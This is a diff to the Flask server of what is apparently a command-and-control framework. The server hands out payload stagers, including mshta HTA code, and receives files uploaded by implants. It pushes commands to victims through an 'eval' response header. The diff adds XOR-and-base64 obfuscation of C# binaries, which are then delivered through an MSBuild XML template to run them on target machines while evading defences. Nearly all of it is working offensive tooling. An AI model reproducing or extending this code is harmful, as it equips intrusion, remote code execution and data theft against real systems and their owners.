@@ -1,7 +1,9 @@
+import base64
 import logging
 import os
 import urllib.parse as parse
 import sys
+from itertools import cycle
 
 from connect import color, connection, loader, util
 from flask import Flask, make_response, render_template, request, send_file
@@ -10,21 +12,17 @@ app = Flask(__name__)
 
 checkin_uri = f'/{util.generate_id()}'
 
-def render(connection, file):
-    mshta_code = parse.quote(render_template(f'hta/code.hta', variables = connection.stager.variables, connection_id = connection.connection_id, checkin_uri = checkin_uri, server_context = util.server_context()))
-    return render_template(f'{file}', variables = connection.stager.variables, connection_id = connection.connection_id, checkin_uri = checkin_uri, server_context = util.server_context(), random_data=util.random_data, mshta_code = mshta_code, random_string = util.generate_str())
+def xor_crypt_and_encode(data, key):
+     xored = []
+     for (x,y) in zip(data, cycle(key)):
+         xored.append(x ^ ord(y))
+     return(base64.b64encode(bytes(xored)).decode('utf-8'))
 
-@app.route('/<format_id>', methods=['GET'])
-def serve_stagers(format_id):
-    remote_addr = request.remote_addr
-    if format_id not in engine.STAGERS.keys():
-        return render_template('random.html', random_data=util.random_data)
-    stager = engine.STAGERS[format_id]
-    color.information(f'{stager.format} file requested ({remote_addr})')
-    connection = engine.create_connection(stager)
-    connection.system_information['ip'] = remote_addr
-    return render(connection, f'{connection.stager.format}/stager.{connection.stager.format}')
-
+'''
+Routes
+ - /checkin_uri (POST)
+ - /format_id (GET)
+'''
 @app.route(f'{checkin_uri}', methods=['POST'])
 def checkin():
     response = make_response(render_template('random.html', random_data=util.random_data))
@@ -46,6 +44,23 @@ def checkin():
             color.information(f'{sys.getsizeof(data)} Bytes recieved from ({request.remote_addr}) saving to downloads/{filename}.')
             loader.download(data, f'{filename}')
     if connection.job_queue:
+        return parse_job_queue(connection, response)
+    return response
+
+@app.route('/<format_id>', methods=['GET'])
+def serve_stagers(format_id):
+    if '.' in format_id:
+        format_id = format_id.split('.')[0]
+    remote_addr = request.remote_addr
+    if format_id not in engine.STAGERS.keys():
+        return render_template('random.html', random_data=util.random_data)
+    stager = engine.STAGERS[format_id]
+    color.information(f'{stager.format} file requested ({remote_addr})')
+    connection = engine.create_connection(stager)
+    connection.system_information['ip'] = remote_addr
+    return render(connection, f'{connection.stager.format}/stager.{connection.stager.format}')
+
+def parse_job_queue(connection, response):
         job = connection.job_queue.pop(0)
         if job.type == 'function':
             color.verbose(f'Sending .. {connection.stager.format}/functions/{job.data}.{connection.stager.format}')
@@ -78,11 +93,25 @@ def checkin():
                 except:
                     color.information('Error creating stager response.')
                     return response
+            if 'csharp:' == arguments[0]:
+                try:
+                    random_string = util.generate_str()
+                    csharp_bin_path = arguments[1]
+                    csharp_bin_b64_xor = xor_crypt_and_encode(loader.retrieve_file(csharp_bin_path), random_string)
+                    list_of_arugments = '","'.join(arguments[2:])
+                    response = make_response(render_template(f'resources/msbuild.xml', arguments = f'"{list_of_arugments}"', csharp_bin = csharp_bin_b64_xor, variables = connection.stager.variables, random_string = random_string))
+                    arguments = ['response.ResponseBody', f'"{random_string}"']
+                except:
+                    color.information('Error creating msbuild response.')
+                    return response
             arguments = ','.join(arguments)
             color.verbose(f'Sending .. {command}({arguments})')
             response.headers['eval'] = parse.quote(f'{command}({arguments})')
             return response
-    return response
+
+def render(connection, file):
+    mshta_code = parse.quote(render_template(f'hta/code.hta', variables = connection.stager.variables, connection_id = connection.connection_id, checkin_uri = checkin_uri, server_context = util.server_context()))
+    return render_template(f'{file}', variables = connection.stager.variables, connection_id = connection.connection_id, checkin_uri = checkin_uri, server_context = util.server_context(), random_data=util.random_data, mshta_code = mshta_code, random_string = util.generate_str())
 
 def run(ip, port):
     os.environ['WERKZEUG_RUN_MAIN'] = 'true'
